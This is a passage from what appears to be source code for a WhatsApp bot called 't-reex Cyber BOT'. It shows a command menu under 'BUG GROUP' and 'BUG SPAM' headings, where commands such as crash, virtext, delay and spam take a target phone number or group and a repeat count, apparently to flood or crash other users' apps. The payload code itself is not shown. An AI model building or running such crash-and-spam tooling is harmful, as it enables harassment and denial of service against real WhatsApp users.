╠➤𝐫𝐞𝐞𝐱𝐬𝐚𝐧𝐭𝐞𝐭 𝟔𝟐𝟖𝐱𝐱𝐱@𝐬.𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩.𝐧𝐞𝐭|𝟏𝟎|𝟏𝟎𝐬
...
╔══════[ 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 ]══════⊱
╠➤𝐠𝐚𝐬𝐫𝐞𝐞𝐱 𝟏𝟏𝟐𝟔𝟕𝟒𝟒𝟒𝟖𝐱𝐱𝐱
╠➤𝐫𝐞𝐞𝐱𝐬𝐚𝐧𝐭𝐞𝐭𝐠𝐜  𝟏𝟐𝟑𝟕𝟖𝟗𝟏𝐱𝐱𝐱𝐱@𝐠.𝐮𝐬|𝟏𝟎|𝟏𝟎𝐬
...
╠➤𝐫𝐞𝐞𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╚════[ ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ]══════⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

╔══════[ 𝐁𝐔𝐆 𝐒𝐏𝐀𝐌 ]══════⊱
╠➤𝐫𝐞𝐞𝐱𝐤𝐚𝐧𝐠𝐛𝐮𝐭𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐝𝐞𝐥𝐚𝐲 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐬𝐭𝐢𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐛𝐮𝐠𝐢𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐛𝐮𝐠𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
...
╠➤𝐫𝐞𝐞𝐱𝐭𝐞𝐱𝐭𝐯 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐠𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐜𝐫𝐚𝐬𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐜𝐫𝐚𝐬𝐡𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐜𝐫𝐚𝐬𝐡𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐫𝐞𝐞𝐱𝐜𝐫𝐚𝐬𝐡𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
...
╚════[ ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ]══════⊱`,
contextInfo:{"externalAdReply": {"title": `SC ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/channel/UCpkP5kroMXEeoHLGX4VUTeA`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
